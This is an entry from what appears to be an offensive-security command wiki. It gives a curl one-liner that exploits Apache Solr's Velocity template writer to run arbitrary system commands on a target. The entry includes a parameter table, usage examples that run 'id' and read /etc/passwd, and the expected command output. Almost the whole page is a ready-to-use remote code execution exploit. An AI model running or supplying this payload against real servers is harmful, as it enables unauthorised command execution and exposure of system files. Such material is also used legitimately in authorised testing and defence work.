---
id: uuid-curl-velocity
data: >-
  curl
  "http://target-ip:port/solr/core1/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27command%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
tags:
  - rce
  - velocity
type: command
output: null
executor: bash
platforms:
  - Web
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:37.306Z'
verified: false
validated: true
submitted: true
---
# curl-velocity-payload

## Command

```bash
curl "http://target-ip:port/solr/core1/select?q=*:*&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27command%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end"
```

## Description

Sends a URL-encoded Velocity template payload to Solr for RCE, replacing 'command' with system commands like 'id' or 'cat /etc/passwd'.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| wt=velocity | Enable Velocity writer | Yes |
| v.template.custom | Custom template payload | Yes |
| exec('command') | System command to run | Yes |

## Examples

### Basic Usage

```bash
curl "...exec(%27id%27)..."
```

### Advanced Usage

```bash
curl "...exec(%27cat%20/etc/passwd%27)..."  # With file read
```

## Expected Output

Command output embedded in Velocity response, e.g., uid=999(solr)...

## Related

- [[commands/curl-get-request]]
- [[procedures/Exploit-Solr-Velocity-RCE-ID-Command]]
